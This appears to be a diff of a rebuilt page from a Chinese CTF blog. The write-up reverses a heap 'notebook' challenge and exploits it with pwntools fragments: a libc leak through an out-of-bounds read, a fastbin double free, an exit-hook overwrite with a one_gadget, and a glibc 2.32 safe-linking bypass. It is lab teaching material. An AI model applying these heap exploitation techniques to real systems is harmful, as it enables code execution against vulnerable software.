@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,8 +263,7 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-olUuXOUe" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
-
+    <div id="aplayer-HiDJkULD" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
 <p>给分享会准备的一个简单的复现。</p>
 <h2><span id="太长不看">太长不看</span></h2><ol>
 <li>逆向确定漏洞点-uaf以及越界读写</li>
@@ -280,10 +279,9 @@
 <p>​        然后进入菜单，整体只有三个功能，增删查，经典没有改。每个功能看一下。</p>
 <h3><span id="add">add</span></h3><p>​        这里需要我们自己指定的是idx而不是size，而idx最大不能超过我们开头输的那个idx，同时也不能小于0，这里规避了负数下标的情况，但依然可能存在越界读取。具体原因稍后分析。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%884.05.38.png" alt="截屏2022-06-11 下午4.05.38"></p>
-<p>​        具体看一下这里的申请流程。首先在<code>ptr+8*idx</code>上申请一个0x30大小的堆空间，相当于在<code>ptr+8*idx</code>这个地址保存了这个0x30 chunk的指针。接着idx2自减，这里暂时不清楚idx2是多少。这个地方的逻辑详细解释就是idx是八字节，8*8就是64字节，也就是一个0x40的空间。通过ptr+8 * idx的方式来索引申请chunk的地址。</p>
+<p>​        具体看一下这里的申请流程。首先在<code>ptr+8*idx</code>上申请一个0x30大小的堆空间，相当于在<code>ptr+8*idx</code>这个地址保存了这个0x30 chunk的指针。接着idx2自减，这里暂时不清楚idx2是多少。这个地方的逻辑详细解释就是idx是八字节，8<em>8就是64字节，也就是一个0x40的空间。通过ptr+8 </em> idx的方式来索引申请chunk的地址。</p>
 <p>​        然后输入chunk的内容。也比较清楚。随便动调一下确认一下结构。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">40</span>)</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%884.26.03.png" alt="截屏2022-06-11 下午4.26.03"></p>
 <p>​        看起来非常的正常。继续下一个功能。</p>
 <h3><span id="show">show</span></h3><p>​                <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%884.39.22.png" alt="截屏2022-06-11 下午4.39.22"></p>
@@ -302,7 +300,6 @@
 <p>​        这里的偏移是<code>0x218C60</code>。</p>
 <p>​        但是加上偏移以后实际地址对应的值是0，但是下面一片地址倒是有值，干脆就用他们来计算了。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">off1 = <span class="number">0x7ffff7fa9ce0</span>-<span class="number">0x7ffff7b8d000</span></span><br><span class="line">off2 = <span class="number">0x7ffff7fa9ce0</span>-<span class="number">0x7ffff7d91000</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;A small notebook keeps everything&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;How many pages your notebook will be? :&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x20040000</span>))</span><br><span class="line">show(off1/<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - off2 + <span class="number">0x10</span>   </span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>
-
 <p>​        确实有用。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%888.57.35.png" alt="截屏2022-06-11 下午8.57.35"></p>
 <p>​        那么接下来就是指针的利用了</p>
@@ -314,16 +311,12 @@
 <p>​        fsop的话太过于小题大做了（我暂时也不是很会house of emma那个），可以考虑直接打exit hook。</p>
 <p>​        这里由于实在太板子了，我就直接copy exp了。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        add(i,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">        free(i)<span class="comment"># fill tcache</span></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#tcahce 1</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line">heapbase=heapbase&lt;&lt;<span class="number">12</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)<span class="comment">#fastbin -&gt;7</span></span><br><span class="line">free(<span class="number">8</span>)<span class="comment">#-&gt;8-&gt;7</span></span><br><span class="line">free(<span class="number">7</span>)<span class="comment">##-&gt;7-&gt;8-&gt;7,double free</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#tcache</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,p64(exit))</span><br><span class="line">add(<span class="number">7</span>,p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">7</span>,p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">7</span>,p64(onegadget)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-
-
-
 <h3><span id="exit_hook劫持">exit_hook劫持</span></h3><p>​        exit hook的劫持之前倒是没有接触很多，毕竟有malloc 谁打这个。</p>
 <p>​        在这里算是一个新知识了。这个东西并不像是malloc hook或者free hook那样可以直接简单地通过libc base加一个简单的偏移找到。由于调用它的层级比较多，所以需要一层一层地寻找。</p>
 <p>​        libc还在编译，没有符号的话不太好找，先看原理。</p>
 <p>​        由于在libc2.31后这个东西发生了较大改变，所以分类讨论。</p>
 <p>2.31前可以直接套公式，exit hook是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc-2.23 : 0×5f0040+3848 </span><br><span class="line">libc-2.27 : 0×61b060 + 3840</span><br></pre></td></tr></table></figure>
-
 <p>2.31后</p>
 <p><code>libc2.31 9.2</code>下偏移为0x1ED608</p>
 <p>libc2.31 9.7只能利用fsop。</p>
@@ -333,20 +326,16 @@
 <p>这里我寻找的方式是ida,偏移为0x21A6C8。具体方式是通过搜索定位到<code>fpclose</code>-&gt;<code>fpclose(0)</code>，找到后者对应的偏移。</p>
 <p>注意到这里偏移为0x21A6C8，但是实际exp编写的时候是0x21A6C0。有一个八字节的偏差。这里其实就是一个16字节对齐的问题，如果是c8就会报错，所以改成c0，这里随便怎么改其实只要对齐然后不要差得超过0x30就行。比如c8 -0x10 ，然后多来几个个onegadget效果也是一样的。</p>
 <p>这里具体的原理就不介绍了，感兴趣可以去搜一下。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%8810.39.07.png"></p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-06-11%20%E4%B8%8B%E5%8D%8810.39.07.png" alt></p>
 <h3><span id="指针异或">指针异或</span></h3><p>最后这里还要注意一个点。就是glibc2.32的指针异或。</p>
 <blockquote>
-<p>​    glibc2.32引入的新的防御机制-<strong>safe-linking</strong>(异或<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>),其核心思想是:将<strong>指针的地址</strong>右移12位再和<strong>指针本身</strong>异或,该操作是在chunk被放入tcache bin和从tcache bin中取出时进行。</p>
+<p>​    glibc2.32引入的新的防御机制-<strong>safe-linking</strong>(异或<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=加密&amp;spm=1001.2101.3001.7020">加密</a>),其核心思想是:将<strong>指针的地址</strong>右移12位再和<strong>指针本身</strong>异或,该操作是在chunk被放入tcache bin和从tcache bin中取出时进行。</p>
 </blockquote>
 <p>也就是</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure>
-
 <p>所以当我们构造fd的时候，要考虑到后面程序会对这个指针进行一个相当于解密的工作，所以我们填进去的fd内容也需要是被加密的，即fd的地址右移再异或fd本身，这里fd的地址再右移可以直接用堆基址来处理，然后异或system地址就好了。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = ((heapbase)&gt;&gt;<span class="number">12</span>)^(libcbase+off3)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2><span id="参考">参考</span></h2><p><a target="_blank" rel="noopener" href="http://1.117.139.210/2021/05/20/PWN%E5%AD%A6%E4%B9%A0%E2%80%94exit-hook-%E5%81%B7%E5%AE%B6/">http://1.117.139.210/2021/05/20/PWN学习—exit-hook-偷家/</a></p>
+<h2><span id="参考">参考</span></h2><p><a target="_blank" rel="noopener" href="http://1.117.139.210/2021/05/20/PWN学习—exit-hook-偷家/">http://1.117.139.210/2021/05/20/PWN学习—exit-hook-偷家/</a></p>
 <p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273101.htm">https://bbs.pediy.com/thread-273101.htm</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40712959/article/details/115696356">https://blog.csdn.net/qq_40712959/article/details/115696356</a></p>
 
